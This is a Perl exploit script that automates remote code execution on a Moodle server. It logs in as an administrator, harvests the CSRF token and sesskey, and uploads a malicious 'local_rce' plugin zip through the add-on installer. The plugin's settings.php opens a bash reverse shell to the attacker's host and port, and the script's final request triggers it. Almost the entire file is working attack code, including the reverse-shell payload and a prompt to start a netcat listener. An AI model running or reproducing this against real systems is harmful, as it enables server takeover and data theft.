#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;
use Data::Dumper;
use Archive::Zip;               #sudo cpan -i Archive::Zip


my($user, $pass) = qw(admin Pass1234!);
my ($rhost, $lhost, $lport) = qw(10.0.0.13 10.0.0.9 4444);
my $login = "http://$rhost/moodle/login/index.php";
my $upload = "http://$rhost/moodle/repository/repository_ajax.php?action=upload";
my $install = "http://$rhost/moodle/admin/tool/installaddon/index.php";
#my $trigger = "http://$rhost/moodle/local/rce/version.php";
my $trigger = "http://$rhost/moodle/local/rce/settings.php";    #settings.php seems to be best spot to place/trigger exploit
                                                                #it ll work nice with both new/re-exploit
                                                                #***moodle/local/rce must be writable
my $ua = LWP::UserAgent->new;
$ua->cookie_jar({});
$ua->proxy(["http", "https"], "http://127.0.0.1:8080");                                                                                                                
$ua->requests_redirectable(["POST", "GET"]);                                                                                                                           
                                                                                                                                                                       
my $res = $ua->get($login);                                     #need to get csrf token before post login                                                              
print $ua->cookie_jar->as_string;                                                                                                                                      
                                                                                                                                                                       
my $crfToken = $res->content =~ /name="logintoken" value="(\w{32})"/? $1 : die("no csrfToken??");                                                                      
                                                                #grab csrf token                                                                                       
my $loginForm = {                                               #post login                                                                                            
  anchor=>"",                                                                                                                                                          
  logintoken=>$crfToken,                                                                                                                                               
  username=>$user,                                                                                                                                                     
  password=>$pass,                                                                                                                                                     
};                                                                                                                                                                     
                                                                                                                                                                       
$res = $ua->post($login, Content=>$loginForm);                  #login                                                                                                 
                                                                #redirect should landed on /moodle/my/                                                                 
                                                                #then grab sesskey here                                                                                
                                                                                                                                                                       
my $sesskey = $res->content =~ /"sesskey":"(\w{10})"/? $1 : die("no sesskey??");                                                                                       
print"[sesskey]: $sesskey\n";                                   #grab sesskey                                                                                          
                                                                #then bunch of ajax...                                                                                 
                                                                                                                                                                       
$res = $ua->get($install);                                      #initiate install plugin request                                                                       
                                                                #and get itemid && client_id

my ($itemid, $client_id) = $res->content =~ /"itemid":(\d{9}),.+?,"client_id":"(\w{13})"/? ($1, $2) : die("no itemid || client_id??");
print"[itemid]: $itemid\n[client_id]: $client_id\n";

my $fileForm = {
  "accepted_types[]"=>".zip",
  itemid=>$itemid,
  client_id=>$client_id,
  repo_id=>4,
  sesskey=>$sesskey,
  maxbytes=>-1,
  repo_upload_file=>["./rce.zip", "rce.zip","Content-Type"=>"application/zip"],
};

buildPayload($lhost, $lport);                                   #build zip payload

$res = $ua->post($upload, "content-type"=>"form-data", Content => $fileForm);
                                                                #simulate ajax post upload
my $installForm = {
  sesskey=>$sesskey,
  _qf__tool_installaddon_installfromzip_form=>1,
  mform_showmore_id_general=>0,
  mform_isexpanded_id_general=>1,
  zipfile=>$itemid,
  plugintype=>"",
  rootdir=>"",
  submitbutton=>"Install plugin from the ZIP file",
};

$res = $ua->post($install, Content=>$installForm);              #request install plugin

my ($component, $storage) = $res->content =~ /name="installzipcomponent" value="(\w+?)".+?name="installzipstorage" value="(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})"/s? 
  ($1, $2) : die("no installzipstorage || installzipcomponent??");
print"\ninstallzipcomponent: $component, installzipstorage: $storage\n";

my $confirmForm = {
  installzipcomponent=>$component,
  installzipstorage=>$storage,
  installzipconfirm=>1,
  sesskey=>$sesskey,
};

print"nc -lnvp 4444??\n";

$res = $ua->post($install, Content=>$confirmForm);              #confirm install, trigger unzip to moodle/local/ **will overwritre old one too
#print $res->headers->as_string;

$res = $ua->get($trigger);                                      #trigger exploit


sub buildPayload{
  my ($ip, $port) = @_;
  my $version_php = '
<?php
defined("MOODLE_INTERNAL") || die();
$plugin->version   = 2019082200;
$plugin->requires  = 2019052000;
$plugin->component = "local_rce";
';
                                                                #add revshell in settings.php seems to be the best spot
                                                                #mainly for reexploit
  my $settings_php = "
<?php
exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\");
defined('MOODLE_INTERNAL') || die();
if (\$ADMIN->fulltree){
}
";

  my $local_rce_php = '
<?php
$string["pluginname"] = "RCE";
';

  my $access_php = '
<?php
defined("MOODLE_INTERNAL") || die();
$capabilities = array();
';

  my $az = Archive::Zip->new();
  $az->addString($version_php, "rce/version.php");
  $az->addString($settings_php, "rce/settings.php");
  $az->addString($access_php, "rce/db/access.php");
  $az->addString($local_rce_php, "rce/lang/en/local_rce.php");
  die("fail writeToFileNamed!") if $az->writeToFileNamed("./rce.zip");
}
